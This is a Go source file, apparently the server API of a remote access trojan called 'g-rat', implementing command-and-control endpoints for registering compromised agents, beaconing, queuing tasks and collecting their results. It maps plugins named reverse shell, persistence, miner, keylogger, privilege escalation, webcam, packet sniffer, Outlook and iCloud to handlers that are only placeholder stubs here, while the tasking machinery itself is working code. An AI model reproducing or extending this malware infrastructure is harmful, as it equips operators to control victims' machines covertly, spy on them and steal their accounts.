package api

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/sevil11/g-rat/server/core"
	"github.com/sevil11/g-rat/shared"
)

var (
	activeAgents   = make(map[string]*shared.Agent)
	agentsMutex    sync.RWMutex
	taskQueue      = make(map[string][]shared.Task)
	taskMutex      sync.RWMutex
	results        = make(map[string][]shared.Result)
	resultsMutex   sync.RWMutex
	serverStartTime = time.Now()
)

// PluginHandlers maps plugin names to their HTTP handlers
var PluginHandlers = map[string]http.HandlerFunc{
	"reverse_shell":   handleReverseShell,
	"persistence":     handlePersistence,
	"miner":           handleMiner,
	"keylogger":       handleKeylogger,
	"escalate":        handleEscalate,
	"packet_sniffer":  handlePacketSniffer,
	"screenshot":      handleScreenshot,
	"webcam":          handleWebcam,
	"port_scan":       handlePortScan,
	"process_control": handleProcessControl,
	"outlook":         handleOutlook,
	"icloud":          handleICloud,
}

// HandleServerStatus returns the server status information
func HandleServerStatus(w http.ResponseWriter, r *http.Request) {
	agentsMutex.RLock()
	agentCount := len(activeAgents)
	agentsMutex.RUnlock()
	
	status := map[string]interface{}{
		"version": "1.0.0",
		"uptime":  int(time.Since(serverStartTime).Seconds()),
		"agents":  agentCount,
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(status)
}

// HandleRegister processes agent registration
func HandleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var agent shared.Agent
	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
		http.Error(w, "Invalid agent data", http.StatusBadRequest)
		return
	}

	// Generate unique ID if not provided
	if agent.ID == "" {
		agent.ID = core.GenerateUID()
	}

	agent.FirstSeen = time.Now()
	agent.LastSeen = time.Now()
	agent.Online = true

	// Store agent in memory and database
	agentsMutex.Lock()
	activeAgents[agent.ID] = &agent
	agentsMutex.Unlock()

	if err := core.SaveAgent(&agent); err != nil {
		log.Printf("Failed to save agent: %v", err)
	}

	// Return agent ID to client
	resp := map[string]string{"agent_id": agent.ID}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
	
	log.Printf("Agent registered: %s (%s) from %s", agent.ID, agent.SystemInfo.Hostname, agent.IP)
}

// HandleBeacon updates agent's last seen time
func HandleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var beacon struct {
		AgentID string `json:"agent_id"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
		http.Error(w, "Invalid beacon data", http.StatusBadRequest)
		return
	}
	
	agentsMutex.Lock()
	if agent, exists := activeAgents[beacon.AgentID]; exists {
		agent.LastSeen = time.Now()
		agent.Online = true
	}
	agentsMutex.Unlock()
	
	w.WriteHeader(http.StatusOK)
}

// HandleTask sends tasks to agents
func HandleTask(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent_id")
	if agentID == "" {
		http.Error(w, "Missing agent_id parameter", http.StatusBadRequest)
		return
	}
	
	taskMutex.RLock()
	agentTasks, exists := taskQueue[agentID]
	if !exists || len(agentTasks) == 0 {
		// No tasks, send a no-op task
		taskMutex.RUnlock()
		task := shared.Task{
			ID:         core.GenerateUID(),
			Type:       "noop",
			CreateTime: time.Now(),
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(task)
		return
	}
	
	// Get first task and remove from queue
	task := agentTasks[0]
	taskQueue[agentID] = agentTasks[1:]
	taskMutex.RUnlock()
	
	// Update agent last seen
	agentsMutex.Lock()
	if agent, exists := activeAgents[agentID]; exists {
		agent.LastSeen = time.Now()
	}
	agentsMutex.Unlock()
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(task)
	log.Printf("Sent task %s to agent %s: %s", task.ID, agentID, task.Type)
}

// HandleResult processes task results from agents
func HandleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var result shared.Result
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid result data", http.StatusBadRequest)
		return
	}
	
	// Store result
	resultsMutex.Lock()
	if _, exists := results[result.AgentID]; !exists {
		results[result.AgentID] = make([]shared.Result, 0)
	}
	results[result.AgentID] = append(results[result.AgentID], result)
	resultsMutex.Unlock()
	
	// Save to database
	if err := core.SaveResult(&result); err != nil {
		log.Printf("Failed to save result: %v", err)
	}
	
	w.WriteHeader(http.StatusOK)
	log.Printf("Received result for task %s from agent %s", result.TaskID, result.AgentID)
}

// HandleAgents returns the list of active agents
func HandleAgents(w http.ResponseWriter, r *http.Request) {
	agentsMutex.RLock()
	agents := make([]*shared.Agent, 0, len(activeAgents))
	for _, agent := range activeAgents {
		agents = append(agents, agent)
	}
	agentsMutex.RUnlock()
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agents)
}

// HandleTasks allows admins to add tasks to the queue
func HandleTasks(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		var task shared.Task
		if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
			http.Error(w, "Invalid task data", http.StatusBadRequest)
			return
		}
		
		agentID := r.URL.Query().Get("agent_id")
		if agentID == "" {
			http.Error(w, "Missing agent_id parameter", http.StatusBadRequest)
			return
		}
		
		task.ID = core.GenerateUID()
		task.CreateTime = time.Now()
		
		taskMutex.Lock()
		if _, exists := taskQueue[agentID]; !exists {
			taskQueue[agentID] = make([]shared.Task, 0)
		}
		taskQueue[agentID] = append(taskQueue[agentID], task)
		taskMutex.Unlock()
		
		resp := map[string]string{"task_id": task.ID}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
		log.Printf("Added task %s to queue for agent %s: %s", task.ID, agentID, task.Type)
	} else if r.Method == http.MethodGet {
		agentID := r.URL.Query().Get("agent_id")
		
		taskMutex.RLock()
		var tasks []shared.Task
		if agentID != "" {
			tasks = taskQueue[agentID]
		} else {
			// Return all tasks
			tasks = make([]shared.Task, 0)
			for _, agentTasks := range taskQueue {
				tasks = append(tasks, agentTasks...)
			}
		}
		taskMutex.RUnlock()
		
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(tasks)
	} else {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// HandleTaskResults returns results for a specific task
func HandleTaskResults(w http.ResponseWriter, r *http.Request) {
	taskID := r.URL.Query().Get("task_id")
	if taskID == "" {
		http.Error(w, "Missing task_id parameter", http.StatusBadRequest)
		return
	}
	
	// Look for the task result
	resultsMutex.RLock()
	defer resultsMutex.RUnlock()
	
	for agentID, agentResults := range results {
		for _, result := range agentResults {
			if result.TaskID == taskID {
				response := map[string]interface{}{
					"task_id": taskID,
					"agent_id": agentID,
					"status": "completed",
					"output": result.Output,
					"error": result.Error,
					"exit_code": result.ExitCode,
					"start_time": result.StartTime,
					"finish_time": result.FinishTime,
				}
				
				w.Header().Set("Content-Type", "application/json")
				json.NewEncoder(w).Encode(response)
				return
			}
		}
	}
	
	// If we reach here, the task wasn't found or is still pending
	response := map[string]interface{}{
		"task_id": taskID,
		"status": "pending",
		"output": "",
		"error": "",
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// Plugin handlers - simplified implementations
func handleReverseShell(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Reverse shell plugin handled")
}

func handlePersistence(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Persistence plugin handled")
}

func handleMiner(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Miner plugin handled")
}

func handleKeylogger(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Keylogger plugin handled")
}

func handleEscalate(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Privilege escalation plugin handled")
}

func handlePacketSniffer(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Packet sniffer plugin handled")
}

func handleScreenshot(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Screenshot plugin handled")
}

func handleWebcam(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Webcam plugin handled")
}

func handlePortScan(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Port scan plugin handled")
}

func handleProcessControl(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Process control plugin handled")
}

func handleOutlook(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Outlook plugin handled")
}

func handleICloud(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "iCloud plugin handled")
}
